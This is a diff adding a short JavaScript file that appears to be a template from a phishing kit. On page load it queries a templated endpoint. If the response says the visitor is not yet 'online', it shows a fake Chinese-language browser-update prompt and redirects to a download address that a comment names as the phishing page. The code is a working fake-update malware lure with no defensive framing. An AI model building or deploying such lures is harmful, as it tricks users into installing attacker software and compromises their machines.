@@ -1,0 +1,54 @@
+window.onload = function () {
+  var url = "{{QUERY}}"; //查询接口地址
+  var xhr = createXHR();
+  //xhr.setRequestHeader("If-None-Match","\"22426f327b8cd1:0\"");
+  //xhr.setRequestHeader("If-Modified-Since", "Sat, 31 Dec 2021 02:51:00 GMT");
+  xhr.open("GET", url, false);
+  xhr.send(null);
+  var text = xhr.responseText; //获取接口结果
+  console.log(text);
+
+  if (text == "FALSE") {
+        var r=confirm("您好,浏览器需要更新下载程序!是否继续?");
+        if (r==true){
+            window.location.href = "{{DOWNLOAD}}"; //这里是钓鱼页面的地址
+            //x="你按下的是\"确定\"按钮.";
+        }
+        else{
+            console.log(text);
+            //x="你按下的是\"取消\"按钮。";
+        }
+            //alert("您好,浏览器需要更新下载程序...");
+            //window.location.href = "{{DOWNLOAD}}"; //这里是钓鱼页面的地址
+  } else {
+            //alert("已经上线-无需下载");
+            console.log(text);
+  }
+};
+
+function createXHR() {
+  var XHR = [
+    function () {
+      return new XMLHttpRequest();
+    },
+    function () {
+      return new ActiveXObject("Msxml2.XMLHTTP");
+    },
+    function () {
+      return new ActiveXObject("Msxml3.XMLHTTP");
+    },
+    function () {
+      return new ActiveXObject("Microsoft.XMLHTTP");
+    }
+  ];
+  var xhr = null;
+  for (var i = 0; i < XHR.length; i++) {
+    try {
+      xhr = XHR[i]();
+    } catch (e) {
+      continue;
+    }
+    break;
+  }
+  return xhr;
+}
